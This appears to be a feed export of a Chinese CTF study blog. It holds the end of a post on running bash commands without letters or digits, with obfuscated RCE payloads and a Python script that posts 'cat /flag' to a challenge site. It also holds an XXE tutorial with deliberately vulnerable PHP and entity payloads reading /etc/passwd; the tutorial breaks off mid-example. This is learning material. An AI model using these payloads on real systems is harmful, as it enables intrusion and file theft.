title="利用$(())构造"></a>利用$(())构造</h3><p>前面我们已经知道<code>$(())</code>用于算术运算，而默认<code>$(())</code>为0，我们尝试取反：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo $((~$(())))</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-003415.png"></p><p>那对-2取反呢</p><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-003503.png"></p><p>这里又得到了1，linux中的取反操作时针对二进制进行的，那么现在就可以通过相加减获得数字。</p><blockquote><p>比如对5取反，会将5转换成二进制00000101，再取反为11111010，1表负，反转位加1即00000101表6，即-6</p></blockquote><p>根据上面的payload，我们的目的其实只用得到0，1，2，那思路不就和$?一样嘛，只用<strong>将<code>$?</code>换成<code>$(())</code>即可</strong>，这里同样进行了<strong>算术扩展解析，所以需要两个bash</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;__&#125;))\\$(($&#123;____&#125;#$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;_____&#125;$&#123;_____&#125;$&#123;__&#125;$&#123;__&#125;))\&#x27;</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-003914.png"></p><p>说白了，只要能得到0，1，2，无论取反和自增都能得到想要的命令，下面尝试下取反：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0： $(())</span><br><span class="line">-1: $((~$(())))</span><br><span class="line">1:  $((~$((~$(($(())))$((~$(())))))))    </span><br><span class="line">2:  $(($((~$((~$(($(())))$((~$(())))))))&lt;&lt;$((~$((~$(($(())))$((~$(())))))))))     1&lt;&lt;1</span><br><span class="line">2：  $((~$(($((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><blockquote><p>上面是省略了+号后的式子，0取反为-1，-2取反为1，-3取反为2</p></blockquote><p>所以把上面的式子与之前payload对应的数字换掉即可，由于需要$’\154\163’</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1：$((~$(())))</span><br><span class="line">1：$((~$((~$(($(())))$((~$(())))))))</span><br><span class="line">3：$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">4: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">5: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">6: $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p>即：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash&lt;&lt;&lt;bash\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br></pre></td></tr></table></figure><blockquote><p>注意2个bash</p></blockquote><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-033556.png"></p><p>然后就是利用变量拼接构造bash,payload:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__=$(());$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\&lt;\&lt;\&lt;\$\&#x27;\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\\$((~$((~$(($(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))\&#x27;</span><br><span class="line">//ls</span><br></pre></td></tr></table></figure><p><img src="/2025/03/06/shell%E5%8F%98%E9%87%8F%E6%89%A7%E8%A1%8CRCE/QQ20241228-034050.png"></p><p><strong>取反脚本</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://15a309e4-9e6d-4a18-8767-7be0a1efdfa9.challenge.ctf.show/&quot;</span></span><br><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">r = &#123;&#125;</span><br><span class="line"></span><br><span class="line">x=<span class="string">&#x27;$((~$(())))&#x27;</span><span class="comment">#-1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">        r[i]=<span class="string">&#x27;$((~$((&#x27;</span>+x</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">                r[i]+=x</span><br><span class="line">        r[i]+=<span class="string">&#x27;))))&#x27;</span></span><br><span class="line"></span><br><span class="line">r[<span class="number">0</span>]=<span class="string">&#x27;$(())&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;$&#123;!__&#125;&lt;&lt;&lt;$&#123;!__&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">&#x27;\\\\&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]:</span><br><span class="line">                payload+=r[<span class="built_in">int</span>(i)]</span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">r=requests.post(url,data=&#123;<span class="string">&quot;ctf_show&quot;</span>:payload,&#125;)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><p><strong>自增脚本</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="string">&#x27;cat /flag&#x27;</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;__=$(())&amp;&amp;___=$((++__))&amp;&amp;____=$((++___))&amp;&amp;_____=$(())&amp;&amp;$&#123;!_____&#125;&lt;&lt;&lt;$&#123;!_____&#125;\\&lt;\\&lt;\\&lt;\\$\\\&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">        payload+=<span class="string">f&#x27;\\\\$((2#<span class="subst">&#123;<span class="built_in">bin</span>(<span class="built_in">int</span>(<span class="built_in">oct</span>(<span class="built_in">ord</span>(c))[<span class="number">2</span>:]))[<span class="number">2</span>:]&#125;</span>))&#x27;</span>.replace(<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;$&#123;__&#125;&#x27;</span>).replace(<span class="string">&#x27;2&#x27;</span>,<span class="string">&#x27;$&#123;____&#125;&#x27;</span>).replace(<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;$&#123;_____&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload+=<span class="string">&#x27;\\\&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><blockquote><p><strong>自增需要抓包后url编码传参</strong></p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://xz.aliyun.com/news/11688?u_atoken=9341340a53a29d070e698cac517ace72&u_asig=1a0c381017412736154966901e00f3">利用shell脚本变量构造无字母数字命令</a></p><p><a href="https://www.freebuf.com/articles/system/361101.html">【bashfuck】bashshell无字母命令执行原理</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF学习 </category>
          
          <category> RCE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> RCE </tag>
            
            <tag> shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE学习</title>
      <link href="/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><p>XXE是基于XML的攻击，所以在学习XXE前需了解什么是XML。</p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><strong>XML（Extensible Markup Language）</strong>：与HTML类似，是一种标记语言，但与HTML不同的是，<strong>XML 被设计用来传输和存储数据，而HTML 被设计用来显示数据。</strong>XML 仅仅是纯文本，更重要的是，<strong>通过 XML 可以发明自己的标签，因为 XML 没有预定义的标签</strong>。</p><h3 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h3><ul><li><p><strong>把数据从 HTML 分离</strong></p><p>通过 XML，数据能够存储在独立的 XML 文件中。这样就可以专注于使用 HTML 进行布局和显示，并确保修改底层数据不再需要对 HTML 进行任何的改变。</p></li><li><p><strong>简化数据共享</strong></p><p>XML 数据以纯文本格式进行存储，因此提供了一种独立于软件和硬件的数据存储方法。</p><p>这让创建不同应用程序可以共享的数据变得更加容易。</p></li><li><p><strong>简化数据传输</strong></p><p>通过XML，可以在不兼容的系统之间轻松的交换数据。</p></li><li><p><strong>简化平台的变更</strong></p><p>升级到新的系统（硬件或软件平台），总是非常费时的。必须转换大量的数据，不兼容的数据经常会丢失。</p><p>XML 数据以文本格式存储。这使得 XML 在不损失数据的情况下，更容易扩展或升级到新的操作系统、新应用程序或新的浏览器。</p></li><li><p><strong>用于创建新的 Internet 语言</strong></p><p>很多新的 Internet 语言是通过 XML 创建的：</p><p>其中的例子包括：</p><ul><li>XHTML - 最新的 HTML 版本</li><li>WSDL - 用于描述可用的 web service</li><li>WAP 和 WML - 用于手持设备的标记语言</li><li>RSS - 用于 RSS feed 的语言</li><li>RDF 和 OWL - 用于描述资源和本体</li><li>SMIL - 用于描述针针对 web 的多媒体</li></ul></li></ul><h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span>  //声明版本及编码</span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span>          //描述文档的根元素（像在说：“本文档是一个便签”）</span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span>   //四个子元素</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>该 XML 文档包含了 John 给 George 的一张便签。</strong></p></blockquote><p>例：</p><p><img src="/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/ct_nodetree1.gif" alt="img"></p><p>上图表示下面的 XML 中的一本书：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bookstore</span>&gt;</span>             //根元素</span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;COOKING&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Everyday Italian<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Giada De Laurentiis<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>30.00<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;CHILDREN&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Harry Potter<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>J K. Rowling<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2005<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>29.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">book</span> <span class="attr">category</span>=<span class="string">&quot;WEB&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>Learning XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">author</span>&gt;</span>Erik T. Ray<span class="tag">&lt;/<span class="name">author</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">year</span>&gt;</span>2003<span class="tag">&lt;/<span class="name">year</span>&gt;</span> </span><br><span class="line">  <span class="tag">&lt;<span class="name">price</span>&gt;</span>39.95<span class="tag">&lt;/<span class="name">price</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">book</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bookstore</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="元素"><a href="#元素" class="headerlink" title="元素"></a>元素</h3><p><strong>XML 元素必须遵循以下命名规则：</strong></p><ul><li><strong>名称可以含字母、数字以及其他的字符</strong></li><li><strong>名称不能以数字或者标点符号开始</strong></li><li><strong>名称不能以字符 “xml”（或者 XML、Xml）开始</strong></li><li><strong>名称不能包含空格</strong></li></ul><p><strong>可使用任何名称，没有保留的字词。</strong></p><p><strong>属性需要加引号</strong></p><h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>在XML中，一些字符拥有特殊意义，直接放入XML元素中，会发生错误，因为解析器会把它当作新元素的开始。所以需要用实体代替：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">在 XML 中，有 5 个预定义的实体引用</span><br><span class="line">&amp;lt;    &lt;    小于</span><br><span class="line">&amp;gt;    &gt;    大于</span><br><span class="line">&amp;amp;    &amp;    &amp;符</span><br><span class="line">&amp;apos;    &#x27;    单引</span><br><span class="line">&amp;quot;    &quot;    双引</span><br></pre></td></tr></table></figure><p>XML文档有自己的一个格式规范，这个格式规范是由一个叫做DTD（document type definition）的东西控制的：</p><p><strong>DTD 的声明方式分为两种：内部 DTD 和外部 DTD ，其区别就在于：对 XML 文档中的元素、属性和实体的 DTD 的声明是在 XML 文档内部引用还是引用外部的 DTD文件。</strong></p><p>内部TDT：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; //声明xml版本</span><br><span class="line">&lt;!DOCTYPE note [   //声明此文档是note类型的文档</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  //声明此文档的所有元素</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;  //定义to元素的类型为PCDATA，PCDATA表示可包含任意字符串</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;  // 定义from元素类型为PCDATA</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt; // 定义heading为PCDATA</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;  // 定义body为PCDATA</span><br><span class="line">&lt;!ENTITY writer &quot;hello world&quot;&gt; // 定义一个内部实体</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Tove&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Jani&lt;/from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don&#x27;t forget me this weekend&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p><strong>外部TDT：</strong></p><ul><li><p><strong>通用实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE xxe [</span><br><span class="line">&lt;!ELEMENT name ANY &gt; #定义元素为ANY，即可以接受任何元素。</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt; // 定义通用实体</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;body&gt;&amp;xxe;&lt;/body&gt; #定义一个外部实体</span><br><span class="line">&lt;/root&gt;</span><br></pre></td></tr></table></figure><blockquote><p><code>&amp;xxe</code>用于引用，即引用后面的<code>SYSTEM &quot;file:///c:/test.dtd&quot;</code>,而<code>SYSTEM</code>引用外部资源，文件并执行。</p></blockquote><blockquote><p>除了 SYSTEM 关键字的引用方式，还有一种引用方式是使用 PUBLIC 引用公用 DTD 的方式:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure></blockquote></li><li><p><strong>参数实体</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt;</span><br><span class="line">%an-element; %remote-dtd;  //引用an-element，remote-dtd两个参数</span><br></pre></td></tr></table></figure><blockquote><p>% 实体名（这里空格不能少）在 DTD 中定义，并且只能在 DTD 中使用 %实体名。同时。参数实体同样可引用外部实体。</p></blockquote></li></ul><h2 id="XML外部实体注入"><a href="#XML外部实体注入" class="headerlink" title="XML外部实体注入"></a>XML外部实体注入</h2><p><img src="/2025/03/02/XXE%E5%AD%A6%E4%B9%A0/QQ2025lan.png"></p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><strong>XXE（XML External Entity）是指xml外部实体攻击漏洞。XML外部实体攻击是针对解析XML输入的应用程序的一种攻击。当包含对外部实体的引用的XML输入被弱配置XML解析器处理时，就会发生这种攻击。这种攻击通过构造恶意内容，可导致读取任意文件、执行系统命令、探测内网端口、攻击内网网站等危害。</strong></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p><strong>由于 SYSTEM 标识符引用的实体能够访问本地或远程的内容的特性，攻击者可通过控制其内容获取本地或远程文件内容。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SYSTEM file:///etc/passwd</span><br></pre></td></tr></table></figure><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><p><strong>判断漏洞是否存在最直接的方法就是用burp抓包，然后，修改HTTP请求方法，修改Content-Type头部字段等等，查看返回包的响应，看看应用程序是否解析了发送的内容，一旦解析了，那么有可能XXE攻击漏洞</strong></p><p>常见<strong>可能会产生xxe漏洞的文件</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">dom.php # 示例：使用DOMDocument解析body</span><br><span class="line">index.php</span><br><span class="line">SimpleXMLElement.php # 示例：使用SimpleXMLElement类解析body</span><br><span class="line">simplexml_load_string.php # 示例：使用simplexml_load_string函数解析body</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="file-get-contents函数"><a href="#file-get-contents函数" class="headerlink" title="file_get_contents函数"></a><strong>file_get_contents函数</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="variable">$dom</span>=<span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>,LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line"><span class="variable">$creds</span>=<span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$creds</span>-&gt;username;</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$creds</span>-&gt;password;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;hello&#x27;</span>.<span class="variable">$username</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p><strong>file_get_contents函数读取了php:&#x2F;&#x2F;input传入的数据,但是传入的数据没有经过任何过滤,直接在loadXML函数中进行了调用并通过了echo函数输入$username的结果，这样就导致了XXE漏洞的产生。</strong></p></blockquote><h4 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a><strong>读取文件</strong></h4><p><strong>通过加载外部实体，利用file:&#x2F;&#x2F;、php:&#x2F;&#x2F;等伪协议读取本地文件</strong></p><p><strong>SVG格式</strong>（一种基于XML的图像文件格式，用于创建二维矢量图形）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">&lt;!ENTITY file SYSTEM &quot;要读取的文件路径&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;svg height=&quot;100&quot; width=&quot;1000&quot;&gt;</span><br><span class="line">  &lt;text x=&quot;10&quot; y=&quot;20&quot;&gt;&amp;file;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p><strong>有回显：</strong></p><p><strong>用于读取php文件、文档</strong>。</p><ul><li><p><strong>直接外部实体声明</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE creds[</span><br><span class="line">&lt;!ELEMENT userename ANY&gt;</span><br><span class="line">&lt;!ELEMENT password ANY&gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM=&quot;file:///etc/passwd&quot;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">  &lt;username&gt;&amp;xxe&lt;/username&gt;</span><br><span class="line">  &lt;password&gt;test&lt;/password&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml 